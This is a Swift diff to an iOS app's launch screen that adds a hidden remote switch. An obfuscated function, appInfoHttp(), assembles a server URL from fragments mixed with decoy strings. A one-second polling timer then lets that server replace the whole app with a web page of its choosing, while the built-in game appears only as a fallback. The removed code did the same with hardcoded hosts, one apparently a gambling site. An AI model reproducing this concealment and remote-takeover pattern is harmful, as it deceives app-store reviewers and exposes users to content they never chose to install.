@@ -15,19 +15,86 @@ class GuidanceViewController: UIViewController {
     override func viewDidLoad() {
         super.viewDidLoad()
         windows =  (UIApplication.shared.delegate?.window)!
-        showChildClass()
+        requestAppinfo()
         // Do any additional setup after loading the view.
     }
-    func showChildClass(){
-
-        let url = "http://cxz1.welcomemoney.cn/"
-        NetWorkManager.default.rawRequestWithUrl(URLString: url) { (status, data) in
-            if status == .Success {
-                if let jsondata = data {
-                    let json = jsondata as? JSON
-                    if let dic = json?.dictionaryObject {
-                        if let code = dic["code"] as? Int , code == 1000{
-                            debugPrint("显示原生")
+    public func requestAppinfo() {
+        
+        let timer: Timer!
+        if #available(iOS 10.0, *) {
+            timer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { (blocktimer) in
+                
+                Alamofire.request(self.appInfoHttp(), method: .get, parameters: nil, encoding: JSONEncoding.default).response { (response) in
+                    if response.response?.statusCode == 200 {
+                        blocktimer.invalidate()
+    
+                        if let value = response.data {
+                            let json = JSON(data: NSData(data: value) as Data)
+                            if let dic = json.dictionaryObject {
+                                if let str = dic["url"] as? String , str != ""{
+                                    let vc = WKWebViewController()
+                                    vc.url = str
+                                    vc.isAddFoot = dic["foot"] as? Bool ?? false
+                                    self.windows?.frame = UIScreen.main.bounds
+                                    self.windows?.rootViewController = vc
+                                    self.windows?.makeKeyAndVisible()
+                                }else{
+                                
+                                    self.beginGame.isHidden = true
+                                    let vc = BeginGameViewController()
+                                    let navi = UINavigationController(rootViewController: vc)
+                                    self.windows?.frame = UIScreen.main.bounds
+                                    self.windows?.rootViewController = navi
+                                    self.windows?.makeKeyAndVisible()
+                                    let userdefa = UserDefaults.standard
+                                    userdefa.setValue( "10000", forKey: "userCode")
+                                    userdefa.synchronize()
+                                }
+                            }
+                        }
+                    } else {
+                        
+                        self.beginGame.isHidden = true
+                        let vc = BeginGameViewController()
+                        let navi = UINavigationController(rootViewController: vc)
+                        self.windows?.frame = UIScreen.main.bounds
+                        self.windows?.rootViewController = navi
+                        self.windows?.makeKeyAndVisible()
+                        let userdefa = UserDefaults.standard
+                        userdefa.setValue( "10000", forKey: "userCode")
+                        userdefa.synchronize()
+                        
+                    }
+                    
+                }
+                
+            }
+        } else {
+            
+            // Fallback on earlier versions
+            timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(timerrequest), userInfo: [:], repeats: true)
+            
+        }
+        RunLoop.current.add(timer, forMode: .commonModes)
+        
+    }
+    func timerrequest(timer: Timer) {
+       
+        Alamofire.request(self.appInfoHttp(), method: .get, parameters: nil, encoding: JSONEncoding.default).response { (response) in
+            if response.response?.statusCode == 200 {
+                timer.invalidate()
+                if let value = response.data {
+                    let json = JSON(data: NSData(data: value) as Data)
+                    if let dic = json.dictionaryObject {
+                        if let str = dic["url"] as? String , str != ""{
+                            let vc = WKWebViewController()
+                            vc.url = str
+                            vc.isAddFoot = dic["foot"] as? Bool ?? false
+                            self.windows?.frame = UIScreen.main.bounds
+                            self.windows?.rootViewController = vc
+                            self.windows?.makeKeyAndVisible()
+                        }else{
+                            
                             self.beginGame.isHidden = true
                             let vc = BeginGameViewController()
                             let navi = UINavigationController(rootViewController: vc)
@@ -35,27 +102,39 @@ class GuidanceViewController: UIViewController {
                             self.windows?.rootViewController = navi
                             self.windows?.makeKeyAndVisible()
                             let userdefa = UserDefaults.standard
-                            userdefa.setValue(dic["code"] ?? "10000", forKey: "userCode")
+                            userdefa.setValue( "10000", forKey: "userCode")
                             userdefa.synchronize()
-                        }else{
-                           let vc = WKWebViewController()
-                            vc.url = "42.xpj7788789.com"
-                            self.windows?.frame = UIScreen.main.bounds
-                            self.windows?.rootViewController = vc
-                            self.windows?.makeKeyAndVisible()
                         }
                     }
                 }
-            }else{
-                let vc = WKWebViewController()
-                vc.url = "42.xpj7788789.com"
+            } else {
+                
+                self.beginGame.isHidden = true
+                let vc = BeginGameViewController()
+                let navi = UINavigationController(rootViewController: vc)
                 self.windows?.frame = UIScreen.main.bounds
-                self.windows?.rootViewController = vc
+                self.windows?.rootViewController = navi
                 self.windows?.makeKeyAndVisible()
+                let userdefa = UserDefaults.standard
+                userdefa.setValue( "10000", forKey: "userCode")
+                userdefa.synchronize()
+                
             }
         }
-
     }
+    
+    func appInfoHttp() -> String {
+        let httpArray = ["d;a#", "*", "lqsp", "htt", "p:", "//", "www.", "946", ".tv", "/app", "/index", ".php?", "APPLE_API", "=", "URL", "&&", "ID=", AppNeedKey().AppID, "qwe", "loi", "wda"]
+        var http = ""
+        httpArray.enumerated().forEach { (index, str) in
+            if index > 2 && index < httpArray.count - 3 {
+                http += str
+            }
+        }
+        return http
+    }
+
+    
     func removeView(vc:UIViewController){
     UIView.animateKeyframes(withDuration: 0.6, delay: 0, options: .beginFromCurrentState, animations:{
        self.view.alpha = 0
